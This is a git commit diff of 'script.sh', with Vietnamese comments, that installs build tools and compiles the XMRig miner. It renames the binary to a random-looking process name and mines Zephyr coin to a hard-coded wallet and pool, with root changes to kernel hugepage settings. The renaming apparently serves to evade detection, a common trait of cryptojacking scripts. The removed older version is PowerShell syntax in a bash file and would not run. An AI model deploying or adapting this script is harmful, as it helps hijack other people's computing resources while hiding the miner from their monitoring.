04a551a6f8bf2aae80bbce3d2a38bbb7104556cc
wollfoo <nhac.tien1988@gmail.com>
2024-05-07 00:10:03 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,90 +1,41 @@
 #!/bin/bash
 
-# Define constants
-$XMrigVersion = '6.21.0'
-$VmNrHugepages = 1280
-$WorkDir = '/usr/share/work'
+# Cập nhật gói và cài đặt sysctl cho vm.nr_hugepages
+sudo apt-get update
+sudo sysctl -w vm.nr_hugepages=1280
+sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
-# Define functions
-function Update-System {
-	# Update system and set vm.nr_hugepages
-	sudo apt-get update
-	sudo sysctl -w vm.nr_hugepages=$VmNrHugepages
-	sudo bash -c "echo vm.nr_hugepages=$VmNrHugepages >> /etc/sysctl.conf"
-}
+# Định nghĩa các biến cần thiết
+VERSION=6.21.0
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+POOL=ca-zephyr.miningocean.org:5432
+USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
+ALGO=rx/0
+DONATE=1
 
-function Install-Packages {
-	# Install necessary packages
-	param ($GpuType)
-	$packages = @('git', 'wget', 'screen')
+# Cài đặt các gói cần thiết
+apt-get install -y git wget screen cmake g++ libuv1-dev libssl-dev libhwloc-dev
 
-	if ($GpuType -eq 'cuda') {
-		$packages += 'nvidia-cuda-toolkit'
-	} elseif ($GpuType -eq 'opencl') {
-		$packages += 'ocl-icd-opencl-dev'
-	}
+# Tạo thư mục và di chuyển vào thư mục làm việc
+mkdir -p /usr/share/work
+cd /usr/share/work
 
-	sudo apt-get install -y $packages
-}
+# Tải xuống và giải nén XMRig
+rm -rf xmrig-$VERSION
+wget https://github.com/xmrig/xmrig/archive/refs/tags/v$VERSION.tar.gz
+tar -xvzf v$VERSION.tar.gz
+rm -f v$VERSION.tar.gz
+mv xmrig-$VERSION xmrig
+cd xmrig
+mkdir build && cd build
+cmake ..
+make -j$(nproc)
 
-function Setup-Directories {
-	# Set up directories
-	sudo mkdir -p $WorkDir
-	Write-Output $WorkDir
-}
+# Đổi tên tệp thực thi và sao chép để sử dụng
+mv xmrig $azure -n
+cp $azure "$cpuname"
+rm -f xmrig
 
-function Download-And-Extract-Xmrig {
-	# Download and extract xmrig
-	param ($Version, $WorkDir)
-	$tarUrl = "https://github.com/xmrig/xmrig/releases/download/v$Version/xmrig-$Version-linux-x64.tar.gz"
-	$tarFile = "xmrig-$Version-linux-x64.tar.gz"
-	$downloadPath = "$WorkDir/$tarFile"
-
-	wget -O $downloadPath $tarUrl
-	tar -xzvf $downloadPath -C $WorkDir
-
-	$xmrigDir = "$WorkDir/xmrig-$Version"
-	$xmrigPath = "$xmrigDir/xmrig"
-	$renamedPath = "$xmrigDir/xmrig_renamed"
-
-	sudo mv $xmrigPath $renamedPath
-	Write-Output $renamedPath
-}
-
-function Detect-Gpu {
-	# Detect GPU compatibility (CUDA or OpenCL)
-	if (Get-Command nvidia-smi -ErrorAction SilentlyContinue) {
-		Write-Output 'cuda'
-	} else {
-		Write-Output 'opencl'
-	}
-}
-
-function Start-Xmrig {
-	# Start xmrig
-	param ($Pool, $Username, $WorkDir, $GpuType)
-	$donateLevel = 1
-	$algo = 'rx/0'
-	$xmrigPath = Download-And-Extract-Xmrig $XMrigVersion $WorkDir
-
-	$cmd = @($xmrigPath, '--donate-level', $donateLevel, '-o', $Pool, '-u', "${Username}.ws-p x", '-a', $algo, '-k', '--tls')
-
-	if ($GpuType -eq 'cuda') {
-		$cmd += '--cuda'  # Use NVIDIA CUDA for GPU mining
-	} elseif ($GpuType -eq 'opencl') {
-		$cmd += '--opencl'  # Use OpenCL for GPU mining
-	}
-
-	sudo $cmd
-}
-
-# Main script
-Update-System
-$gpuType = Detect-Gpu
-Install-Packages $gpuType
-$workDir = Setup-Directories
-
-$pool = 'us-zephyr.miningocean.org:5432'
-$username = 'ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB'
-
-Start-Xmrig $pool $username $workDir $gpuType
+# Bắt đầu đào coin trên GPU với XMRig
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ws-p x -a $ALGO -k --tls
